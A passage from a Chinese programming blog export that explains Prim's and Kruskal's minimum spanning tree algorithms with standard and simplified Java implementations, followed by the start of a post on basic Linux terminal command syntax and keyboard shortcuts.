<p>计算图的最小生成树的算法有很多种，但这些算法都可以看做是贪心算法的一种特殊情况，这些算法的不同之处在于保存切分和判定权重最小的横切边的方式。</p>
<hr>
<h1 id="三、Prim算法"><a href="#三、Prim算法" class="headerlink" title="三、Prim算法"></a>三、Prim算法</h1><p>Prim算法，它的每一步都会为一棵生成中的树添加一条边。一开始这棵树只有一个顶点，然后会向它添加<code>V - 1</code>条边，每次总是将下一条连接树中的顶点与不在树中的顶点且权重最小的边加入到树中。</p>
<p><strong>Prim算法的切分规则</strong></p>
<p>把最小生成树中的顶点看做是一个集合，把不在最小生成树中的顶点看做是另外一个集合。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140816.png" alt="  "></p>
<h2 id="1-Prim算法流程"><a href="#1-Prim算法流程" class="headerlink" title="1. Prim算法流程"></a>1. Prim算法流程</h2><p>Prim算法始终将图中的顶点切分成两个集合，最小生成树顶点和非最小生成树顶点，通过不断的重复做某些操作，可以逐渐将非最小生成树中的顶点加入到最小生成树中，直到所有的顶点都加入到最小生成树中。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140818.png" alt="  "></p>
<h2 id="2-Prim算法实现"><a href="#2-Prim算法实现" class="headerlink" title="2. Prim算法实现"></a>2. Prim算法实现</h2><p>代码中提到的<code>Edge</code>、<code>EdgeWeightedGraph</code> 类可详见<a href="https://blog.csdn.net/qq_51938362/article/details/127342059?spm=1001.2014.3001.5502">Java数据结构-图</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimMST</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 索引代表顶点，值表示当前顶点和最小生成树之间的最短边</span></span><br><span class="line">    <span class="keyword">private</span> Edge[] edgeTo;</span><br><span class="line">    <span class="comment">// 索引代表顶点，值表示当前顶点和最小生成树之间的最短边的权重</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span>[] distTo;</span><br><span class="line">    <span class="comment">// 索引代表顶点，如果当前顶点已经在生成树中，则值为true，否则为false</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span>[] marked;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     存放树中顶点与非树中顶点之间的有效横切边</span></span><br><span class="line"><span class="comment">     使用优先队列，Edge实现了 Comparable</span></span><br><span class="line"><span class="comment">     每次返回权重最小的边</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;Edge&gt; pq;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据一副加权无向图，创建最小生成树计算对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PrimMST</span><span class="params">(EdgeWeightedGraph G)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化edgeTo</span></span><br><span class="line">        <span class="built_in">this</span>.edgeTo = <span class="keyword">new</span> <span class="title class_">Edge</span>[G.V()];</span><br><span class="line">        <span class="comment">// 初始化distTo</span></span><br><span class="line">        <span class="built_in">this</span>.distTo = <span class="keyword">new</span> <span class="title class_">double</span>[G.V()];</span><br><span class="line">        Arrays.fill(distTo, Double.POSITIVE_INFINITY);</span><br><span class="line">        <span class="comment">// 初始化marked</span></span><br><span class="line">        <span class="built_in">this</span>.marked = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line">        <span class="comment">// 初始化pq</span></span><br><span class="line">        pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Edge&gt;(G.V());</span><br><span class="line">        visit(G, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历索引最小优先队列，拿到最小和N切边对应的顶点，把该顶点加入到最小生成树中</span></span><br><span class="line">        <span class="keyword">while</span> (!pq.isEmpty())&#123;</span><br><span class="line">            <span class="comment">// 取出当前距离生成树权重最小的边</span></span><br><span class="line">            <span class="type">Edge</span> <span class="variable">e</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="comment">// 获取两个顶点的索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> e.either(), w = e.other(v);</span><br><span class="line">            <span class="comment">// 如果两个点现在均已加入了生成树，则不做处理</span></span><br><span class="line">            <span class="keyword">if</span> (marked[v] &amp;&amp; marked[w])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// 当前 v 点未加入</span></span><br><span class="line">            <span class="keyword">if</span> (!marked[v])</span><br><span class="line">                visit(G, v);</span><br><span class="line">            <span class="comment">// 当前 w 点未加入</span></span><br><span class="line">            <span class="keyword">if</span> (!marked[w])</span><br><span class="line">                visit(G, w);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将顶点v添加到最小生成树中，并且更新数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(EdgeWeightedGraph G, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">        <span class="comment">// 把顶点v添加到最小生成树中</span></span><br><span class="line">        marked[v] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 更新数据</span></span><br><span class="line">        <span class="keyword">for</span> (Edge e : G.adj(v)) &#123;</span><br><span class="line">            <span class="comment">// 获取e边的另外一个顶点(当前顶点是v)</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> e.other(v);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            判断另外一个顶点是不是已经在生成树中，</span></span><br><span class="line"><span class="comment">            如果在树中，则不做任何处理，如果不在树中，更新数据</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (marked[w])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 判断边e的权重是否小于从w顶点到树中已经存在的最小边的权重；</span></span><br><span class="line">            <span class="keyword">if</span> (e.weight() &lt; distTo[w])&#123;</span><br><span class="line">                <span class="comment">// 更新数据</span></span><br><span class="line">                edgeTo[w] = e;</span><br><span class="line">                distTo[w] = e.weight();</span><br><span class="line">                pq.offer(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取最小生成树的所有边</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Edge&gt; <span class="title function_">edges</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建队列对象</span></span><br><span class="line">        List&lt;Edge&gt; allEdges = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历edgeTo数组，拿到每一条边，如果不为null，则添加到列表中</span></span><br><span class="line">        <span class="keyword">for</span> (Edge edge : edgeTo) &#123;</span><br><span class="line">            <span class="keyword">if</span> (edge != <span class="literal">null</span>) &#123;</span><br><span class="line">                allEdges.add(edge);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> allEdges;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Prim算法实现精简版"><a href="#3-Prim算法实现精简版" class="headerlink" title="3. Prim算法实现精简版"></a>3. Prim算法实现精简版</h2><p>上述算是Prim算法的标准版，但如果对于解决一些小算法题，设计边、加权有向图类，在代码中还是比较臃肿，以下实现一个Prim算法的精简版，使用邻接矩阵来存储图。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimMST</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 图类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Graph</span>&#123;</span><br><span class="line">        <span class="comment">// 顶点数量</span></span><br><span class="line">        <span class="type">int</span> v;</span><br><span class="line">        <span class="comment">// 使用邻接矩阵存放边，weights[i][j] 代表 i -&gt; j 的权重</span></span><br><span class="line">        <span class="type">double</span>[][] weights;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> v, <span class="type">double</span>[][] weights)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.v = v;</span><br><span class="line">            <span class="built_in">this</span>.weights = weights;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据传入的图，计算最下生成树的权重；</span></span><br><span class="line"><span class="comment">    若不存在生成树，返回 -1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">prim</span><span class="params">(Graph graph)</span>&#123;</span><br><span class="line">        <span class="comment">// 标记已加入最小生成树的顶点</span></span><br><span class="line">        <span class="type">int</span>[] visited = <span class="keyword">new</span> <span class="title class_">int</span>[graph.v];</span><br><span class="line">        <span class="comment">// 标记每个顶点到生成树的最短距离</span></span><br><span class="line">        <span class="type">double</span>[] distTo = <span class="keyword">new</span> <span class="title class_">double</span>[graph.v];</span><br><span class="line">        <span class="comment">// 所有点到生成树的距离都设为正无穷</span></span><br><span class="line">        Arrays.fill(distTo, Double.MAX_VALUE);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         等会遍历时会从 0 作为起始点， 0 号一定会加入生成树，</span></span><br><span class="line"><span class="comment">         所以赋值它到生成树的距离为 0</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        distTo[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">sumWeight</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 遍历 graph.v 次</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; graph.v; ++k)&#123;</span><br><span class="line">            <span class="comment">// 找到目前距离生成树距离最小的顶点的索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tempIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; graph.v; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (visited[i] == <span class="number">0</span> &amp;&amp; (tempIndex == -<span class="number">1</span> || distTo[i] &lt; distTo[tempIndex])) &#123;</span><br><span class="line">                    tempIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k != <span class="number">0</span> &amp;&amp; distTo[tempIndex] == Double.MAX_VALUE)&#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 当前点不为起始点并且距离生成树的距离已为正无穷，说明图已经不连通了，</span></span><br><span class="line"><span class="comment">                 不存在生成树，直接返回 -1</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将该点到生成树的距离加入总权重</span></span><br><span class="line">            sumWeight += distTo[tempIndex];</span><br><span class="line">            <span class="comment">// 标记该点已经加入生成树</span></span><br><span class="line">            visited[tempIndex] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; graph.v; ++j)&#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 用以上加入生成树的点更新其他点到生成树的距离</span></span><br><span class="line"><span class="comment">                 主要是解决 tempIndex 点的连接点</span></span><br><span class="line"><span class="comment">                 这可以比喻为 tempIndex 处的顶点当上了驸马加入了皇家</span></span><br><span class="line"><span class="comment">                 那么跟他有关系的顶点距离皇家的距离也更近了</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                distTo[j] = Math.min(distTo[j], graph.weights[tempIndex][j]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sumWeight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h1 id="四、Kruskal算法"><a href="#四、Kruskal算法" class="headerlink" title="四、Kruskal算法"></a>四、Kruskal算法</h1><p>kruskal算法是计算一副加权无向图的最小生成树的另外一种算法，它的主要思想是按照边的权重(从小到大)处理它们，将边加入最小生成树中，加入的边不会与已经加入最小生成树的边构成环，直到树中含有<code>V - 1</code>条边为止。</p>
<p><strong>kruskal算法和prim算法的区别：</strong></p>
<p>Prim算法是一条边一条边的构造最小生成树，每一步都为一棵树添加一条边。kruskal算法构造最小生成树的时候也是一条边一条边地构造，但它的切分规则是不一样的。它每一次寻找的边会连接一片森林中的两棵树。如果一副加权无向图由V个顶点组成，初始化情况下每个顶点都构成一棵独立的树，则V个顶点对应V棵树，组成一片森林，<br>kruskal算法每一次处理都会将两棵树合并为一棵树，直到整个森林中只剩一棵树为止。</p>
<h2 id="1-Kruskal算法流程"><a href="#1-Kruskal算法流程" class="headerlink" title="1. Kruskal算法流程"></a>1. Kruskal算法流程</h2><p>初始化先将所有边加入优先队列，每次使用<code>poll()</code>取出权重最小的边，并得到该边关联的两个顶点<code>v</code>和<code>w</code>，通过<code>uf.connect(v, w)</code>判断v和w是否已经连通，如果连通，则证明这两个顶点在同一棵树中，那么就不能再把这条边添加到最小生成树中，因为在一棵树的任意两个顶点上添加一条边，都会形成环，而最小生成树不能有环的存在，如果不连通，则通过<code>uf.union(v, w)</code>把顶点<code>v</code>所在的树和顶点<code>w</code>所在的树合并成一棵树，并把这条边加入到<code>mst</code>列表中，这样如果把所有的边处理完，最终<code>mst</code>中存储的就是最小生树的所有边。</p>
<h2 id="2-Kruskal算法实现"><a href="#2-Kruskal算法实现" class="headerlink" title="2. Kruskal算法实现"></a>2. Kruskal算法实现</h2><p>同样的，代码中提到的<code>Edge</code>、<code>EdgeWeightedGraph</code> 类可详见<a href="https://blog.csdn.net/qq_51938362/article/details/127342059?spm=1001.2014.3001.5502">Java数据结构-图</a></p>
<p>同时，在这里还使用了另外一个数据结构-并查集，可详见<a href="https://blog.csdn.net/qq_51938362/article/details/127327907?spm=1001.2014.3001.5502">Java数据结构-并查集</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KruskalMST</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存最小生成树的所有边</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Edge&gt; mst;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     索引代表顶点，使用uf.connect(v,w)可以判断顶点v和顶点w是否在同一颗树中，</span></span><br><span class="line"><span class="comment">     使用uf.union(v,w)可以把顶点v所在的树和顶点w所在的树合并</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> UF_Tree_Weighted uf;</span><br><span class="line">    <span class="comment">// 存储图中所有的边，使用优先队列，对边按照权重进行排序</span></span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;Edge&gt; pq;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据一副加权无向图，创建最小生成树计算对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KruskalMST</span><span class="params">(EdgeWeightedGraph G)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化mst</span></span><br><span class="line">        <span class="built_in">this</span>.mst = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 初始化uf</span></span><br><span class="line">        <span class="built_in">this</span>.uf = <span class="keyword">new</span> <span class="title class_">UF_Tree_Weighted</span>(G.V());</span><br><span class="line">        <span class="comment">// 初始化 pq</span></span><br><span class="line">        <span class="built_in">this</span>.pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 把图中所有的边存储到pq中</span></span><br><span class="line">        <span class="keyword">for</span> (Edge e : G.edges()) &#123;</span><br><span class="line">            pq.offer(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历pq队列，拿到最小权重的边，进行处理</span></span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty() &amp;&amp; mst.size() &lt; G.V() - <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 找到权重最小的边</span></span><br><span class="line">            <span class="type">Edge</span> <span class="variable">e</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="comment">// 找到该边的两个顶点</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> e.either();</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> e.other(v);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            判断这两个顶点是否已经在同一颗树中，</span></span><br><span class="line"><span class="comment">            如果在同一颗树中，则不对该边做处理，</span></span><br><span class="line"><span class="comment">            如果不在一棵树中，则让这两个顶点属于的两棵树合并成一棵树</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (uf.connected(v, w))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            uf.union(v,w);</span><br><span class="line">            <span class="comment">// 让边e进入到mst队列中</span></span><br><span class="line">            mst.add(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取最小生成树的所有边</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Edge&gt; <span class="title function_">edges</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mst;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Kruskal算法实现精简版"><a href="#3-Kruskal算法实现精简版" class="headerlink" title="3. Kruskal算法实现精简版"></a>3. Kruskal算法实现精简版</h2><p>在三中我们使用了Prim算法的精简版，同样的，上述算是kruskal算法的标准版，但如果对于解决一些小算法题，设计边、加权有向图类、以及并查集，在代码中还是比较臃肿，以下实现一个kruskal算法的精简版，使用邻接矩阵来存储图。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KruskalMST</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 图类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Graph</span>&#123;</span><br><span class="line">        <span class="comment">// 顶点数量</span></span><br><span class="line">        <span class="type">int</span> v;</span><br><span class="line">        <span class="comment">// 使用邻接矩阵存放边，weights[i][j] 代表 i -&gt; j 的权重</span></span><br><span class="line">        <span class="type">double</span>[][] weights;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        存放边的信息</span></span><br><span class="line"><span class="comment">        way[i][0] way[i][1] way[i][2]</span></span><br><span class="line"><span class="comment">        分别代表 第 i 条边的起点、终点、权重</span></span><br><span class="line"><span class="comment">        用 Number 类是因为 索引为整数 但是权重为小数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        List&lt;Number[]&gt; way;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> v, <span class="type">double</span>[][] weights)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.v = v;</span><br><span class="line">            <span class="built_in">this</span>.weights = weights;</span><br><span class="line">            <span class="built_in">this</span>.way = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; weights.length; ++i)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; weights[i].length; ++j)&#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     因为是无向图，一条边就有两种形容方式 i -&gt; j 与 j -&gt; i</span></span><br><span class="line"><span class="comment">                     此处只取一种</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="keyword">if</span> (weights[i][j] != Double.MAX_VALUE &amp;&amp; i &lt; j)</span><br><span class="line">                        way.add(<span class="keyword">new</span> <span class="title class_">Number</span>[]&#123;i, j, weights[i][j]&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 按照权重排序，（这就类似上述使用的优先队列了）</span></span><br><span class="line">            Collections.sort(way, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Number[]&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Number[] o1, Number[] o2)</span> &#123;</span><br><span class="line">                    <span class="type">double</span> <span class="variable">r</span> <span class="operator">=</span> (<span class="type">double</span>)o1[<span class="number">2</span>] - (<span class="type">double</span>) o2[<span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">return</span> r &lt; <span class="number">0</span> ? -<span class="number">1</span> : r &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 a, b 归为一组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">connection</span><span class="params">(<span class="type">int</span>[] groups, <span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">gA</span> <span class="operator">=</span> groups[a];</span><br><span class="line">        <span class="type">int</span> <span class="variable">gB</span> <span class="operator">=</span> groups[b];</span><br><span class="line">        <span class="comment">// 全部化为 gA 的 值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; groups.length; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span> (groups[i] == gB)</span><br><span class="line">                groups[i] = gA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回 a 所在分组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span>[] groups, <span class="type">int</span> a)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> groups[a];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据传入的图，计算最下生成树的权重；</span></span><br><span class="line"><span class="comment">    若不存在生成树，返回 -1</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">kruskal</span><span class="params">(Graph graph)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 建立 并查集</span></span><br><span class="line">        <span class="type">int</span>[] groups = <span class="keyword">new</span> <span class="title class_">int</span>[graph.v];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; groups.length; ++i)</span><br><span class="line">            groups[i] = i;</span><br><span class="line">        <span class="comment">// 统计待会找到的边数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">countE</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">sumWeight</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; graph.way.size(); ++i)&#123;</span><br><span class="line">            <span class="comment">// 获取边的 起点、终点、权值</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> (<span class="type">int</span>) graph.way.get(i)[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">int</span>) graph.way.get(i)[<span class="number">1</span>];</span><br><span class="line">            <span class="type">double</span> <span class="variable">w</span> <span class="operator">=</span> (<span class="type">double</span>) graph.way.get(i)[<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">gA</span> <span class="operator">=</span> find(groups, a);</span><br><span class="line">            <span class="type">int</span> <span class="variable">gB</span> <span class="operator">=</span> find(groups, b);</span><br><span class="line">            <span class="keyword">if</span> (gA != gB)&#123;</span><br><span class="line">                <span class="comment">// 若 a、b 不属于同一组，则将他们分为同一组</span></span><br><span class="line">                connection(groups, a, b);</span><br><span class="line">                sumWeight += w;</span><br><span class="line">                countE += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找到的边的数量不为 结点数 - 1， 不存在生成树</span></span><br><span class="line">        <span class="keyword">if</span> (countE &lt; graph.v - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> sumWeight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用命令</title>
    <url>/posts/d0edc1ed.html</url>
    <content><![CDATA[<h1 id="Linux终端命令格式"><a href="#Linux终端命令格式" class="headerlink" title="Linux终端命令格式"></a>Linux终端命令格式</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">command [-option] [parameter]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明：</p>
<ul>
<li><code>command</code>：命令名</li>
<li><code>[options]</code>：选项，可用来对命令进行控制，也可以省略</li>
<li><code>[parameter]</code>：传给命令的参数，可以是0个、一个或多个</li>
</ul>
<hr>
<ul>
<li><strong><code>[]</code> 代表可选</strong></li>
<li><strong>命令名、选项、参数之间有空格进行分割</strong></li>
</ul>
</blockquote>
<hr>
<p><strong>Linux命令使用技巧</strong></p>
<blockquote>
<ul>
<li><code>Tab</code>键自动补全</li>
<li>连续两次<code>Tab</code>键，给出操作提示</li>
<li>使用上下箭头快速调出曾经使用过的命令</li>
<li>使用 <code>clear</code> 命令或 <code>Ctrl+l</code> 实现清屏</li>
</ul>
</blockquote>
<h1 id="快捷操作"><a href="#快捷操作" class="headerlink" title="快捷操作"></a>快捷操作</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctrl + c                   <span class="comment"># 强制停止</span></span><br><span class="line">ctrl + d                   <span class="comment"># 退出或登出</span></span><br><span class="line"><span class="built_in">history</span>                    <span class="comment"># 历史命令搜索</span></span><br><span class="line">!命令前缀                   <span class="comment"># 自动执行上一次匹配前缀的命令</span></span><br><span class="line">ctrl + r                  <span class="comment"># 输入内容匹配历史命令</span></span><br><span class="line">ctrl + a                  <span class="comment"># 跳到命令开头</span></span><br><span class="line">ctrl + e                  <span class="comment"># 跳到命令结尾</span></span><br><span class="line">ctrl + 键盘左键            <span class="comment"># 向左跳一个单词</span></span><br><span class="line">ctrl + 键盘右键            <span class="comment"># 向右跳一个单词</span></span><br><span class="line">ctrl + l                 <span class="comment"># 清屏</span></span><br><span class="line">clear                    <span class="comment"># 清屏</span></span><br></pre></td></tr></table></figure>

